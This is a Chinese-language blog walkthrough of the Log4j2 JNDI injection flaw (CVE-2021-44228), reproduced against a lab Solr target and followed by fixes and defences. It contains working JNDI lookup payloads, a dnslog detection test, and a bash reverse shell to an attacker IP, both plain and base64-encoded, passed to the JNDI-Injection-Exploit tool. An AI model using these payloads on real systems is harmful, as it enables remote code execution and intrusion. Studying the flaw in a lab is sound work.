# Apache Log4j2 查找功能 JNDI 注入 (CVE-2021-44228)

# 漏洞描述

**Apache log4j是Apache的一个开源项目，Apache log4j 2是一个就Java的日志记录工具。该工具重写了log4j框架，并且引入了大量丰富的特性，可以控制日志信息输送的目的地为控制台、文件、GUI组建等，通过定义每一条日志信息的级别，能够更加细致地控制日志的生成过程。**

**log4j2中存在JNDI注入漏洞，当程序记录用户输入的数据时，即可触发该漏洞。成功利用该漏洞可在目标服务器上执行任意代码**





# LDAP

轻型目录访问协议（Lightweight Directory Access Protocol，是一个开放的，中立的，工业标准的应用协议，通过IP协议提供访问控制和维护分布式信息的目录信息







# JNDI

**JNDI(Java Naming and Directory Interface,Java命名和目录接口)是SUN公司提供的一种标准的Java命名系统接口，JNDI提供统一的客户端API，通过不同的访问提供者接口JNDI服务供应接口(SPI)的实现，由管理者将JNDI API映射为特定的命名服务和目录系统，使得Java应用程序可以和这些命名服务和目录服务之间进行交互**。

通俗点讲，就是通过名字去寻找对应的资源、位置、服务、对象…当数据源发生变化时，只需要修改数据源就可以了


# JNDI实现原理

JNDI通过lookup()方法解析接收自应用程序的信息，从而去对应的服务（如LDAP、RMI、DNS、文件系统、目录服务…）查找资源。

格式 **${jndi:rmi:192.168.61.129:1099/kvssa5}**

![img](https://img-blog.csdnimg.cn/d34e659f4667479194b573190b3c2ad0.png#pic_center)

# log4j2漏洞原理

**日志中包含 ${},lookup就会去解析括号里面的内容，**

**如：攻击payload:${jndi:rmi:192.168.96.1:1099/wqiyua}**

**当lookup解析到jndi时，就会调用jndi并利用rmi，执行攻击机jndi服务下的class文件并执行，从而造成任意命令执行漏洞**

**exp分析**

```
jndi:ldap:192.168.61.129:1099/shellhttp://192.168.61.129/kvssa5其中kvssa5为恶意脚本当用户输入信息时，应用程序中的log4j2组件会将信息记录到日志中假如日志中含有该语句{jndi:ldap:192.168.61.129:1099/kvssa5}，log4j就会去解析该信息，通过jndi的lookup()方法去解析该URL：ldap:192.168.61.129:1099/kvssa5
解析到ldap，就会去192.168.61.129:1099的ldap服务找名为shell的资源，如果找不到就会去http服务中找
在http中找到shell之后，就会将资源信息返回给应用程序的log4j组件，而log4j组件就会下载下来，然后发现shell是一个.class文件，就会去执行里面的代码，从而实现注入
攻击者就可以通过shell实现任意的命令执行，造成严重危害
```





# 影响范围

- Apache Log4j 2.x < 2.15.0-rc2





# 漏洞复现(检测)

**验证漏洞**

靶场启动成功后，浏览器访问: http://192.168.61.138:8983/solr/admin/cores?action=1

就进入到以下界面，显示的是一堆json格式的数据

![img](https://img-blog.csdnimg.cn/8d794f8590cf42068f33724dc4887bda.png#pic_center)

访问http://dnslog.cn/ 获取一个临时域名

![访问dnslog](https://img-blog.csdnimg.cn/5ad5906ae9644dbdaaa25e855d3c3ab6.png#pic_center)

利用获取到的临时域名构造payload ，直接访问

![构造payload访问](https://img-blog.csdnimg.cn/3af017c0c9e64ebc99289a40eb609c66.png#pic_center)

访问之后，我们查看dnslog.cn页面,点击Refresh按钮刷新，可以看到有请求访问记录，表明存在log4j2漏洞

![刷新dnslog](https://img-blog.csdnimg.cn/bfd05cb8fd1b49119b7627f8951d0036.png#pic_center)







# 反弹shell

已经漏洞存在的情况下，构造攻击payload执行命令反弹shell

```
bash -i >& /dev/tcp/192.168.61.129/4444 0>&1 
```

由于Runtime执行linux命令时管道符不生效，所以需要将命令进行加密

![加密](https://img-blog.csdnimg.cn/6c6e4035801b4582ae56a99c98a0432d.png#pic_center)

https://www.yster.live/runtime-exec-payloads/



**打开kali虚拟机，利用JNDI注入工具 JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar**

**JNDI注入工具下载地址: https://github.com/welk1n/JNDI-Injection-Exploit/releases/tag/v1.0**

**192.168.61.129为kali攻击机监听地址，kali机执行**

**java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C “反弹shell命令” -A “该IP是开启JDNI服务的主机地址”**

```
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C bash -c "{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjYxLjEyOS80NDQ0IDA+JjE=}|{base64,-d}|{bash,-i}" -A 192.168.61.129
```

![kali利用JNDI注入工具](https://img-blog.csdnimg.cn/7b87cb8fb28844ab9611557590d4b8f6.png#pic_center)

得到rmi、ldap参数

![rmi、ldap参数](https://img-blog.csdnimg.cn/4026b676ed8842e2819b1a71245b5024.png#pic_center)

然后在kali攻击机上开启nc监听4444端口

在浏览器访问payload

![浏览器访问payload](https://img-blog.csdnimg.cn/379c801d83014c19b0a1e64088ceaaeb.png#pic_center)

查看监听端，发现shell反弹成功

![反弹shell](https://img-blog.csdnimg.cn/209eeb70b11c42b494cac48a220fe2c8.png#pic_center)

# 修复与防御

## 修复

**补丁之前**

1. 可升级jdk版本至6u211 / 7u201 / 8u191 / 11.0.1以上，可以在一定程度上限制JNDI等漏洞利用方式。
2. 关闭`lookup`功能，即：设置 JVM 启动参数 - `Dlog4j2.formatMsgNoLookups=true`

**更新到rce1**

https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc1。

但不久就被绕过了，经过测试发现URI中不进行URL编码会报这个错，加个空格即可触发${jndi:ldap://127.0.0.1:1389/ badClassName}（需要用户开启lookup功能的基础上才可以）


## 防御

- 禁止用户输入的参数中出现攻击关键字（过滤用户输入）
- 禁止lookup下载远程文件（命名应用）
- 禁止log4j的应用去连接外网
- 禁止log4j使用lookup方法
- 从log4j 的jar包总删除lookup（2.10以下版本）
- 升级到最新版本
- 使用waf



[传送门](https://blog.csdn.net/weixin_46198176/article/details/124917641?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165487344516781685370922%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=165487344516781685370922&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-124917641-null-null.142^v13^pc_search_result_control_group,157^v14^control&utm_term=Apache+Log4j2+%E6%9F%A5%E6%89%BE%E5%8A%9F%E8%83%BD+JNDI+%E6%B3%A8%E5%85%A5+%28CVE-2021-44228%29&spm=1018.2226.3001.4187)